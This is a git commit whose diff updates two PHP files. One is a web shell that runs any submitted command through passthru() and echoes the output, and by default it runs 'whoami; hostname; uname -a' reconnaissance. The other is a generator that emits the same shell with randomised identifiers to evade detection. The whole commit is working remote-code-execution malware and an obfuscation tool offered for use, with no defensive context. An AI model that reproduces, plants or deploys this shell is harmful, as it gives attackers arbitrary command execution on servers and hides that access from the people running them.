6f3b35edec33ec1dfeded6e42daa8573ecedbe03
raincoats <tomshaddock@outlook.com>
2015-06-11 14:11:43 +1000

    more human array names

--- 2.php
+++ 2.php
@@ -1,20 +1,20 @@
 
 <?php
 
-$KvMzVLXmIaosH = <<< EOF
+$kzoEMMVPlDmOL = <<< EOF
 <html>
 	<head>
 		<style>
 			input{ background-color: rgb(255, 255, 255); width: 50%;}
 			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
 			body{ background-color: rgb(250, 250, 250);}
-			AbvvTIjnV7Fgt{ color: rgb(170, 170, 170);}
+			qTsMtr1UvN39{ color: rgb(170, 170, 170);}
 		</style>
 	</head>
 	<body>
-		<form action="v5jQhQVPmSNoP0" id="form" method="POST">
+		<form action="zlbUTKHWpEpMWa" id="form" method="POST">
 			<span>$ </span>
-			<input type="text" name="2233" autocomplete="off" autofocus>
+			<input type="text" name="hlIqeMrer9emR" autocomplete="off" autofocus>
 			<span> 2&gt;&amp;1 </span>
 			<button type="submit">$$$</button>
 		</form>
@@ -22,12 +22,12 @@ $KvMzVLXmIaosH = <<< EOF
 <pre>
 EOF;
 
-function oFmxzlZCvx2LDG($NJvbIIQrdC0){
-	echo "<AbvvTIjnV7Fgt>$ ".$NJvbIIQrdC0."</AbvvTIjnV7Fgt><br>";
-	echo passthru($NJvbIIQrdC0." 2>&1");
+function oj1reZrlnjtDq7($ieUZZzWKhH487){
+	echo "<qTsMtr1UvN39>$ ".$ieUZZzWKhH487."</qTsMtr1UvN39><br>";
+	echo passthru($ieUZZzWKhH487." 2>&1");
 }
-$GqCmp7Jz98I6Rt=$_REQUEST["2233"];
-echo preg_replace('/v5jQhQVPmSNoP0/', basename($_SERVER["SCRIPT_NAME"]), $KvMzVLXmIaosH);
+$dCZMSJiESijSr=$_POST["hlIqeMrer9emR"];
+echo preg_replace('/zlbUTKHWpEpMWa/', basename($_SERVER["SCRIPT_NAME"]), $kzoEMMVPlDmOL);
 
-isset($GqCmp7Jz98I6Rt)? oFmxzlZCvx2LDG($GqCmp7Jz98I6Rt) : $aOY70bs40zQMAr=$anUa7XJFUc8Nm
+isset($dCZMSJiESijSr)? oj1reZrlnjtDq7($dCZMSJiESijSr) : oj1reZrlnjtDq7("whoami; hostname; uname -a")
 ;?>
--- rand.php
+++ rand.php
@@ -13,29 +13,38 @@ function make_random_name(){
 	return ($name = NULL? make_random_name(): $name);
 }
 
-$functions = array();
-
+$functions = array(
+	"eval_function" => make_random_name(),
+	"eval_arg" => make_random_name(),
+	"html_console_tag" => make_random_name(),
+	"post_2233" => make_random_name(),
+	"post_command" => make_random_name(),
+	"script_name" => make_random_name(),
+	"no_command" => '"whoami; hostname; uname -a"',
+	"page_html" => make_random_name(),
+	);
+/*
 for ($i=0; $i<=10; $i++){
 	$functions[$i] = make_random_name();
 }
-
+*/
 echo '
 <?php
 
-$'.$functions[8].' = <<< EOF
+$'.$functions['page_html'].' = <<< EOF
 <html>
 	<head>
 		<style>
 			input{ background-color: rgb(255, 255, 255); width: 50%;}
 			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
 			body{ background-color: rgb(250, 250, 250);}
-			'.$functions[3].'{ color: rgb(170, 170, 170);}
+			'.$functions['html_console_tag'].'{ color: rgb(170, 170, 170);}
 		</style>
 	</head>
 	<body>
-		<form action="'.$functions[5].'" id="form" method="POST">
+		<form action="'.$functions['script_name'].'" id="form" method="POST">
 			<span>$ </span>
-			<input type="text" name="2233" autocomplete="off" autofocus>
+			<input type="text" name="'.$functions['post_2233'].'" autocomplete="off" autofocus>
 			<span> 2&gt;&amp;1 </span>
 			<button type="submit">$$$</button>
 		</form>
@@ -43,14 +52,14 @@ $'.$functions[8].' = <<< EOF
 <pre>
 EOF;
 
-function '.$functions[1].'($'.$functions[2].'){
-	echo "<'.$functions[3].'>$ ".$'.$functions[2].'."</'.$functions[3].'><br>";
-	echo passthru($'.$functions[2].'." 2>&1");
+function '.$functions['eval_function'].'($'.$functions['eval_arg'].'){
+	echo "<'.$functions['html_console_tag'].'>$ ".$'.$functions['eval_arg'].'."</'.$functions['html_console_tag'].'><br>";
+	echo passthru($'.$functions['eval_arg'].'." 2>&1");
 }
-$'.$functions[4].'=$_REQUEST["2233"];
-echo preg_replace('."'/".$functions[5]."/'".', '."basename(\$_SERVER[\"SCRIPT_NAME\"]), $".$functions[8].');
+$'.$functions['post_command'].'=$_POST["'.$functions['post_2233'].'"];
+echo preg_replace('."'/".$functions['script_name']."/'".', '."basename(\$_SERVER[\"SCRIPT_NAME\"]), $".$functions['page_html'].');
 
-isset($'.$functions[4].')? '.$functions[1].'($'.$functions[4].') : $'.$functions[6].'=$'.$functions[7].'
+isset($'.$functions['post_command'].')? '.$functions['eval_function'].'($'.$functions['post_command'].') : '.$functions['eval_function'].'('.$functions['no_command'].')
 ;?>';
 
 ?>
